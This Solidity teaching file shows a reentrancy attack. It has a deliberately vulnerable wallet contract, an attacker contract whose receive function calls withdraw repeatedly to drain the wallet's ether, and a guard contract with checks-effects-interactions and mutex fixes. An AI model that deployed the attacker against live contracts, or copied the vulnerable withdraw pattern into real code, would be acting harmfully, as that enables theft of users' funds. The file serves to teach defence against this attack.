//SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Working of the attack
/* 
the withdraw functions first calls the fallback function of the caller contract. This fallback function
can be coded to call the Wallet deposit again . Since state variables have not been changed till this point , 
the call passes all the checks and fallback is called again transferring the ether again. This forms the reentrancy loops 
and is deicontinued with the condition in fallback function.
*/

contract wallet{
    mapping (address => uint) public balances;

    function deposit() public payable{
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);

        (bool sent , ) = msg.sender.call{value: balances[msg.sender]}("");      // calls the fallback function
        require(sent);
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}


contract Reentrancy {
    wallet public Wallet;

    constructor(address _wallet) {
        Wallet = wallet(_wallet);
    }

    receive() external payable {
        if(address(Wallet).balance >= 1 ether){
            Wallet.withdraw();                          
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);                 
        Wallet.deposit{value: 1 ether}();                 // deposits the amount
        Wallet.withdraw();                                // calls the withdraw function
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
}

// preventive techniques
/*
Point of failure is calling other contracts, which can run malicious code to exploit the vernerablity.
It is recommended finishing all internal work (ie. state changes) first, and only then calling the external function.
1)
checks --> effects --> instruction
2) mutex
*/

contract RentrancyGuard{
    //1)
    mapping (address => uint) public balances;

    function withdraw() public {
        require(balances[msg.sender] > 0);

        uint bal = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent , ) = msg.sender.call{value: bal}("");      // checks --> effects --> instruction
        require(sent);
        
    }

    bool internal locked;

    modifier noReentrant() {                             // mutex
        require(!locked , "No- reentrancy");
        locked = true;
        _;
        locked = false;
    }

}